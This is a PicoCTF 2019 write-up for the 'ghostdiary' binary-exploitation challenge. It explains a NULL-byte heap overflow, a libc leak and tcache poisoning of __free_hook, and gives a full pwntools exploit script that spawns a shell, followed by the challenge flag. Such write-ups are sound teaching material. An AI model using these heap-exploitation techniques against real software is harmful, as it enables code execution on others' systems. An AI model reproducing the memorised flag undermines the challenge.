@@ -1,0 +1,221 @@
+<!--Solve date: 08/03/2020-->
+
+<h1>PicoCTF 2019 - ghostdiary</h1>
+
+<h2>Binary Exploitation - 500 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>This challenge features a heap vulnerability. Let's start by enumerating the various functions available to users.</p>
+
+<ol>
+    <li>
+        <p><b>Choice 1</b> allows the user to create a new page in the diary. The procedure looks for an unused or deleted page starting at the page index, and if one is not found in the first 20, the program tells us to buy a new book and leaves. If room is found, we are given a choice between writing on one side and writing on two sides.</p>
+        <ul>
+            <li><p>Writing on one side limits the chunk data size to 240 (chunk size 0x100). Notice that this size range covers all the fast bins in x64 libc as well as 5 tcache bins (0xc0 - 0x100) that are non-fastbin.</p></li>
+            <li><p>Writing on two sides limits us to a <i>minimum</i> of 271 bytes (chunk size 0x120; the rationale is that if we wanted to write less, we would have selected the other option), and a maximum of 480 (chunk size 0x1f0). Note that all of these are tcache-size, none in fastbins.</p></li>
+        </ul>
+        <p>The page is created and assigned the ID of the empty slot.</p>
+    </li>
+    <li><p><b>Choice 2</b> lets the user write to a page. The user enters a page number, and that is compared with 19. If above, we leave. Then we check the page in the page index; if the page exists (i.e., the entry is non-NULL), then we proceed to <code>read</code> content into that page. The <code>read()</code> function is crafted by hand: there is a single-character read loop that writes characters into the buffer until a newline is reached or the index is exactly equal to the page size. A NULL character is then read to the index. This presents a single NULL byte overflow, which for the largest-sized chunks in a bin will overwrite the lowest byte of the size field of the next consecutive chunk in the heap.</p></li>
+    <li><p><b>Choice 3</b> prints the contents of a page. The user specifies the page ID. The contents are printed with <code>puts()</code>.</p></li>
+    <li><p><b>Choice 4</b> deletes a page. The page is first checked to see if it is valid, and if so, its contents are passed to <code>free()</code>. The pointer is appropriately set to NULL in the page index.</p></li>
+</ol>
+
+<p>The implementation is <i>nearly</i> safe. However, the single-byte NULL overflow opens a host of problems that we can exploit to get a shell. Another bug is the noninitialization of chunks, which will make it easy for us to obtain a leak.</p>
+
+<h5>Information Leaks</h5>
+
+<p>Our first task is to achieve a leak to libc that we can use to calculate the address of <code>system()</code> and free hook. We accomplish this by freeing a chunk into unsorted bin, reallocating from that unsorted chunk, and printing the contents. This is possible because the data in pages aren't initialized. Consider the following series of actions:</p>
+
+<ol>
+    <li><p>Create 8 new pages, each with size 184 (= 0xb8). The chunk size is 0xc0, which is not in fastbins.</p></li>
+    <li>
+        <p>Delete the 8 pages in the reverse order that they were allocated. The state of the heap is now:</p>
+        <p><code>HEAP[tcache][0xc0-size] -> P1 -> P2 -> ... -> P7 -> NULL</code></p>
+        <p><code>LIBC[unsorted] <=> P0</code></p>
+    </li>
+    <li><p>Reallocate 7 pages (#0 - 6) each of size 184. This empties the 0xc0-tcache.</p></li>
+    <li><p>Create a new page (#7) with size 24 (= 0x18). The chunk size is 0x20, the smallest x64 chunk size. First, P0 will be moved into the corresponding smallbin because it is not currently the last remainder and its size is not equal to the requested size. But then it will be immediately used to service the small request, and the remainder will be returned to unsorted bins.</p></li>
+    <li>Read the contents of the new page #7.</li>
+</ol>
+
+<p>Below shows the result of such an operation. We can easily determine the offset of the appropriate smallbin relative to libc to get the base address of libc.</p>
+
+<img src = "./images/pico_ghostdiary_1.png"/>
+
+<p class = "caption">Figure 1. Leaking libc through unsorted bin reallocation.</p>
+
+<h5>Obtaining Overlapping Chunks Through NULL-Byte Poisoning</h5>
+
+<p>Now that we know libc, we need to perform a write to free hook. To accomplish this, we will use a technique known as NULL-byte poisoning, exploiting the off-by-one read routine discussed above to create overlapping chunks. Overlapping chunks are useful because we can control the metadata of one chunk with a legitimate content write to the data section of another. First, let's prepare the heap and prime some tcache chunks. The 0xc0-tcache is currently empty, which is what we want.</p>
+
+<ol>
+    <li><p>Make an additional page (#8) of size 152 (= 0x98), which will create a chunk of size 0xa0 directly allocated from the last remainder of the victim chunk used in the information leak, letting us allocate from the top chunk.</p></li>
+    <li><p>Create dummy 0x120-tcache chunks by allocating then deleting (in reverse order) 7 chunks of size 280 (= 0x118).</p></li>
+    <li><p>Empty the 0x120-tcache by reallocating the 7 large pages (#9 - 15).</p></li>
+</ol>
+
+<p>Now let's set up the new chunks:</p>
+
+<ol>
+    <li><p>Create a page (#16) with size 24 (= 0x18, chunk size 0x20). This will be the vulnerable chunk that we overflow.</p></li>
+    <li><p>Create a page (#17) with size 280 (= 0x118, chunk size 0x120). This is large enough for us to allocate a non-fastbins page along with another page to be overlapped.</p></li>
+    <li><p>Delete pages #9 - 15 to fill up the 0x120-tcache. The next free of a chunk this size will go to the unsorted bin.</p></li>
+    <li><p>Create a page (#9) with size 184 (= 0xb8). This is non-fastbins.</p></li>
+    <li><p>Create a page (#10) with size 24 (= 0x18, chunk size 0x20). The purpose of this small chunk, which will never be freed during the exploit, is to prevent consolidation of our chunks with the top chunk.</p></li>
+</ol>
+
+<p>Now the heap is ready... let's get on with the exploit!</p>
+
+<ol>
+    <li><p>First, create a fake chunk within page #17 by writing to it. Set its PREV_SIZE field to 0x100 so that we pass the <code>corrupted size vs. prev_size</code> check. We write this at offset 0xf0 = 240 relative to the data section.</p></li>
+    <li><p>Now, delete page #17 (the large page in the middle), making it go to unsorted bin.</p></li>
+    <li><p>Perform NULL-byte overflow into the size field of the freed page #17 by writing the maximum length to page #16. Now, when we allocate chunks within the freed page #17, the PREV_SIZE field of page #9 won't get properly updated!</p></li>
+    <li><p>Create a new page (#11) of size 184 (= 0xb8) that will be taken from the previous page #17.</p></li>
+    <li><p>Delete pages #0 - 6 to fill up the 0xc0-tcache. The next free of a chunk this size will go to the unsorted bin.</p></li>
+    <li><p>Create a new page (#0) of size 24 (= 0x18, chunk size 0x20) that will be put just above page #11. Note that this will be the overlapped chunk.</p></li>
+    <li><p>Delete page #11. It goes to unsorted bin.</p></li>
+    <li><p>Delete page #9. It also goes to unsorted bin. The unsorted bin gets consolidated, and page #0 is now "forgotten"!</p></li>
+</ol>
+
+<p>Although it's of no consequence to our attack, note that the unsorted bin now contains two items and looks like:</p>
+
+<p><code>LIBC[unsorted] <=> deleted page #11 + #9 <=> remainder from deleted page #17</code></p>
+
+<p>We could avoid the extra chunk by creating page #0 with a chunk size that exactly matches the difference between the faked size of page #17 and the size of page #11, which is 0x100 - 0xc0 = 0x40 (= 0x38 data size). But sice our next request will be greater than the size of the remainder (0x20) chunk in unsorted bins, it will simply be dumped in the first small bin, and the consolidated page will still be used to service our request.</p>
+
+<ol>
+    <li><p>We now allocate a chunk of size 0x100 by requesting a single page (page #1) of size 240 (= 0xf0). This will overlap the union of the deleted page #11 and the (still live!) page #0. It also gives 0x20 bytes of padding to preserve the unaccounted "remainder" chunk (now in a small bin) produced by the above.</p></li>
+    <li><p>Delete page #0; it will be put in the 0x20-tcache.</p></li>
+    <li><p>Overwrite the forward pointer of the now deleted page #0 (located at offset 0xc0 = 192 in page #1) with the address of free hook. The 0x20-tcache is now poisoned.</p></li>
+    <li><p>Create a page (page #0) of size 24 (chunk size 0x20). It will be put where the overlapped chunk (page #0) originally was.</p></li>
+    <li><p>Create another page (page #2) of size 24 (chunk size 0x20). This will be put at free hook!</p></li>
+    <li><p>Write the address of <code>system()</code> to page #2.</p></li>
+    <li><p>Create another page (page #3) of size 24 (chunk size 0x20). (This will be serviced from the fake remainder chunk from small bins.)</p></li>
+    <li><p>Write "/bin/sh" to the newly-created page #3.</p></li>
+    <li><p>Delete page #3, and get shell.</p></li>
+</ol>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+p = process("./ghostdiary")
+lib = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+
+def createPage(size):
+    p.recvuntil(b"> ")
+    p.sendline(b'1')
+    p.recvuntil(b"> ")
+    if size <= 240:
+        p.sendline(b'1')
+    elif size >= 272 and size <= 480:
+        p.sendline(b'2')
+    else:
+        raise ValueError("Cannot create this size.")
+
+    p.recvuntil(b": ")
+    p.sendline(str(size))
+    return
+
+def deletePage(i):
+    p.recvuntil(b"> ")
+    p.sendline('4')
+    p.recvuntil(b": ")
+    p.sendline(str(i))
+    return
+
+def writePage(i, string, nullTerm = True):
+    p.recvuntil(b"> ")
+    p.sendline('2')
+    p.sendline(str(i))
+    if nullTerm:
+        p.send(string + b'\n')
+    else:
+        p.send(string)
+
+    return
+
+def readPage(i):
+    p.recvuntil(b"> ")
+    p.sendline('3')
+    p.recvuntil(b": ")
+    p.sendline(str(i))
+    p.recvuntil("Content: ")
+    return p.recvline()
+
+small_offs = 0x3ebd50        #2.27
+
+for _ in range(8):
+    createPage(0xb8)
+
+for i in range(8):
+    deletePage(7 - i)       #page 7 goes to unsorted upon free
+
+for _ in range(7):
+    createPage(0xb8)
+
+createPage(0x18)            #will put page 7 in smallbin, then split
+leak = u64(readPage(7)[: -1] + b'\x00\x00')
+log.info("small bin @ LIBC: %s" % (hex(leak)))
+lib.address = leak - small_offs
+log.info("LIBC: %s" % (hex(lib.address)))
+
+createPage(0x98)            #service next chunks from top
+
+for _ in range(7):
+    createPage(0x118)
+
+for i in range(7):
+    deletePage(15 - i)
+
+for _ in range(7):
+    createPage(0x118)
+
+createPage(0x18)
+createPage(0x118)
+
+for i in range(7):
+    deletePage(15 - i)
+
+createPage(0xb8)
+createPage(0x18)
+
+# pass size vs prev_size check
+writePage(17, 0xf0 * b'a' + p64(0x100))
+deletePage(17)
+
+#overflow!
+writePage(16, 0x18 * b'a', False)
+
+createPage(0xb8)
+
+for i in range(7):
+    deletePage(6 - i)
+
+createPage(0x18)
+deletePage(11)
+deletePage(9)
+createPage(0xf0)    #should overlap page #0
+deletePage(0)
+writePage(1, 0xc0 * b'a' + p64(lib.sym[b"__free_hook"]))
+createPage(0x18)
+createPage(0x18)
+writePage(2, p64(lib.sym[b"system"]))
+createPage(0x18)
+writePage(3, b"/bin/sh\x00")
+deletePage(3)
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>picoCTF{nu11_byt3_Gh05T_c80f9d6f}</code></p>
